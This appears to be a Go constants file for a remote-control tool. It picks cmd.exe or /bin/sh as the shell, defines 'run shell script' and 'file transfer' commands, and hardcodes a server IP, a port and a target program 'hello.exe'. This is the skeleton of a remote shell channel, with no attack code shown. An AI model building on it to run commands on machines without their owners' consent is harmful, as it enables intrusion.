/*
* 作者：刘时明
* 时间：2020/6/10-0:57
* 作用：
 */
package common

import "runtime"

var (
	// CMD命令，win=cmd.exe，linux=/bin/sh
	CMD_NAME = "cmd.exe"
)

const (
	// 执行Shell脚本
	CMD_SHELL = iota
	// 文件传输
	CMD_FILE
)

const (
	// 数据数组长度
	MAX_DATE_LEN = 1024 * 1024
	// 每个数据包大小
	MSG_LEN = MAX_DATE_LEN + 4*4
	// 针对的Jar包
	JAR_NAME = "hello.exe"
	// 服务器IP地址
	SERVER_ADDR = "118.24.239.74"
	// 服务器端口
	SERVER_PORT = 8848
)

func init() {
	if runtime.GOOS == "linux" {
		CMD_NAME = "/bin/sh"
	}
}
